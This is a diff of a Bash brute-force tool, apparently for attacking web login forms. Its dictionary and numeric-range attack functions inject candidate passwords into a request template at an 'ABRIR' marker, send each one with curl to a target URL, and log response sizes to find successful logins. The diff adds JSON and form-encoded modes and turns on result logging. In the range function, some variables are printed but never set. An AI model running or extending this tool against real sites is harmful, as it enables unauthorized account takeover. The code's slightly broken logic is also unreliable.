@@ -141,19 +141,26 @@ dictionaryAttack(){
   payload1=$(echo $payload | awk -F'ABRIR' '{print $1}')
   payload2=$(echo $payload | awk -F'ABRIR' '{print $2}')
   fileName=$(setFileName $targetUrl)
-
+  
   fmt="%-25s | %-25s | %-15s | %-12s\n"
+  echo -e "Target: ${greenColor}${targetUrl}${endColor}"
+  echo -e "Payload: ${greenColor}${payload}${endColor}\n"
   printf "$fmt" "PASSWORD" "TOTAL_CARACTERES" "HTTP_CODE" "RESPONSE_TIME"
   echo "-------------------------------------------------------------------------------------------"
   while read  -r  line; do
-    dataRaw="${payload1}${line}${payload2}"
-    #echo "curl --silent --write-out '%{response_code} %{time_total}' ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw}"
-    result=$(curl --silent ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw})
-    #echo $result
+    dataPayload="${payload1}${line}${payload2}"
+    if [ "$dataType" = "json" ]; then
+      dataRaw="--data-raw ${dataPayload}"
+    else 
+      dataRaw=$(echo "&${dataPayload}" | sed 's/&/ --data-urlencode /g')
+    fi
+
+    result=$(curl -s -L -X ${method} ${targetUrl} --header ${header} ${dataRaw})
     totalCharacters=$(echo -n $result | wc -c) 
+
     printf "$fmt" "$line" "$totalCharacters" "$code" "$time"
-    # toSave="Password: $line | Total caracteres: $totalCharacters"
-    # echo $toSave >> $fileName
+    toSave="Password: $line | Total caracteres: $totalCharacters"
+    echo $toSave >> $fileName
     setSleep
   done < $filePath
   echo -e "${greenColor}[*] Ataque culminado ${endColor}"
@@ -187,12 +194,25 @@ rangeAttack(){
   payload2=$(echo $payload | awk -F'ABRIR' '{print $2}')
   fileName=$(setFileName $targetUrl)
   
+  fmt="%-25s | %-25s | %-15s | %-12s\n"
+  echo -e "Target: ${greenColor}${targetUrl}${endColor}"
+  echo -e "Payload: ${greenColor}${payload}${endColor}\n"
+  printf "$fmt" "PASSWORD" "TOTAL_CARACTERES" "HTTP_CODE" "RESPONSE_TIME"
+  echo "-------------------------------------------------------------------------------------------"
   for (( c=$rangeFrom; c<=$rangeTo; c++ )); do
-    dataRaw="${payload1}${c}${payload2}"
-    # echo "curl --silent --request ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw}"
-    result=$(curl --silent --request ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw})
-    echo $result >> $fileName
-    echo -e $result
+    dataPayload="${payload1}${c}${payload2}"
+    if [ "$dataType" = "json" ]; then
+      dataRaw="--data-raw ${dataPayload}"
+    else 
+      dataRaw=$(echo "&${dataPayload}" | sed 's/&/ --data-urlencode /g')
+    fi
+
+    result=$(curl -s -L -X ${method} ${targetUrl} --header ${header} ${dataRaw})
+    totalCharacters=$(echo -n $result | wc -c) 
+
+    printf "$fmt" "$line" "$totalCharacters" "$code" "$time"
+    toSave="Password: $line | Total caracteres: $totalCharacters"
+    echo $toSave >> $fileName
     setSleep  
   done
   echo -e "${greenColor}[*] Ataque culminado ${endColor}"
@@ -225,10 +245,12 @@ errorMessage(){
 
 # config Header
 configHeader(){
-  header="Content-Type: application/x-www-form-urlencoded;charset=UTF-8"
+  dataType="x-form"
+  header="'Content-Type: application/x-www-form-urlencoded;charset=UTF-8'"
   verifyPayload=$(echo $payload | python -c "import sys,json;json.loads(sys.stdin.read());print('OK')" 2>/dev/null)
   if [ "$verifyPayload" = "OK" ]; then
-    header="Content-Type: application/json;charset=UTF-8" 
+    header="'Content-Type: application/json;charset=UTF-8'" 
+    dataType="json"
   fi
 }
 
